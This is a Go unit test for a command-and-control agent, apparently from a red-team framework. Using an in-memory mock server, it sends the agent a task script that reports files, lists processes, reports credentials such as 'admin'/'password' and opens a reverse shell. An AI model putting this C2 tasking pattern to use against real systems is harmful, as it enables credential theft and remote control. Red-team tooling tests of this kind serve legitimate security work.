package agent

import (
	"context"
	"net"
	"sync"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/test/bufconn"
	"realm.pub/tavern/internal/c2/c2pb"
	"realm.pub/tavern/internal/c2/epb"
)

type mockC2Server struct {
	c2pb.UnimplementedC2Server
	tasks              chan *c2pb.Task
	reportTaskOutput   chan *c2pb.ReportTaskOutputRequest
	reportFile         chan *c2pb.ReportFileRequest
	reportProcessList  chan *c2pb.ReportProcessListRequest
	reportCredential   chan *c2pb.ReportCredentialRequest
	fetchAsset         chan *c2pb.FetchAssetRequest
	reverseShell       chan *c2pb.ReverseShellRequest
	reverseShellStream c2pb.C2_ReverseShellServer
}

func newMockC2Server() *mockC2Server {
	return &mockC2Server{
		tasks:              make(chan *c2pb.Task, 10),
		reportTaskOutput:   make(chan *c2pb.ReportTaskOutputRequest, 10),
		reportFile:         make(chan *c2pb.ReportFileRequest, 10),
		reportProcessList:  make(chan *c2pb.ReportProcessListRequest, 10),
		reportCredential:   make(chan *c2pb.ReportCredentialRequest, 10),
		fetchAsset:         make(chan *c2pb.FetchAssetRequest, 10),
		reverseShell:       make(chan *c2pb.ReverseShellRequest, 10),
	}
}

func (s *mockC2Server) ClaimTasks(ctx context.Context, req *c2pb.ClaimTasksRequest) (*c2pb.ClaimTasksResponse, error) {
	var tasks []*c2pb.Task
	select {
	case task := <-s.tasks:
		tasks = append(tasks, task)
	default:
	}
	return &c2pb.ClaimTasksResponse{Tasks: tasks}, nil
}

func (s *mockC2Server) ReportTaskOutput(ctx context.Context, req *c2pb.ReportTaskOutputRequest) (*c2pb.ReportTaskOutputResponse, error) {
	s.reportTaskOutput <- req
	return &c2pb.ReportTaskOutputResponse{}, nil
}

func (s *mockC2Server) ReportCredential(ctx context.Context, req *c2pb.ReportCredentialRequest) (*c2pb.ReportCredentialResponse, error) {
	s.reportCredential <- req
	return &c2pb.ReportCredentialResponse{}, nil
}

func (s *mockC2Server) ReportProcessList(ctx context.Context, req *c2pb.ReportProcessListRequest) (*c2pb.ReportProcessListResponse, error) {
	s.reportProcessList <- req
	return &c2pb.ReportProcessListResponse{}, nil
}

func (s *mockC2Server) ReportFile(stream c2pb.C2_ReportFileServer) error {
	for {
		req, err := stream.Recv()
		if err != nil {
			return err
		}
		s.reportFile <- req
	}
}

func (s *mockC2Server) FetchAsset(req *c2pb.FetchAssetRequest, stream c2pb.C2_FetchAssetServer) error {
	s.fetchAsset <- req
	return nil
}

func (s *mockC2Server) ReverseShell(stream c2pb.C2_ReverseShellServer) error {
	s.reverseShellStream = stream
	for {
		req, err := stream.Recv()
		if err != nil {
			return err
		}
		s.reverseShell <- req
	}
}

func TestAgent_MultiCommand(t *testing.T) {
	lis := bufconn.Listen(1024 * 1024)
	s := grpc.NewServer()
	server := newMockC2Server()
	c2pb.RegisterC2Server(s, server)

	go func() {
		if err := s.Serve(lis); err != nil {
			t.Fatalf("Server exited with error: %v", err)
		}
	}()

	dialer := func(context.Context, string) (net.Conn, error) {
		return lis.Dial()
	}

	agent := New("bufnet",
		WithCallbackInterval(10*time.Millisecond),
		WithDialOptions(grpc.WithContextDialer(dialer), grpc.WithTransportCredentials(insecure.NewCredentials())),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		if err := agent.Run(ctx); err != nil {
			t.Errorf("Agent exited with error: %v", err)
		}
	}()

	tome := `
		report.file("path/to/mock/file")
		report.file("another/path")
		process.list()
		report.credential("admin", "password")
		report.credential("user", "password123")
		pivot.reverse_shell_pty()
	`

	server.tasks <- &c2pb.Task{Id: 1, Tome: &epb.Tome{Eldritch: tome}}

	var wg sync.WaitGroup
	wg.Add(6)

	// Wait for 2 file reports
	go func() {
		defer wg.Done()
		<-server.reportFile
	}()
	go func() {
		defer wg.Done()
		<-server.reportFile
	}()

	// Wait for 1 process list report
	go func() {
		defer wg.Done()
		<-server.reportProcessList
	}()

	// Wait for 2 credential reports
	go func() {
		defer wg.Done()
		<-server.reportCredential
	}()
	go func() {
		defer wg.Done()
		<-server.reportCredential
	}()

	// Wait for 1 reverse shell
	go func() {
		defer wg.Done()
		<-server.reverseShell
	}()

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for all commands to be handled")
	}
}
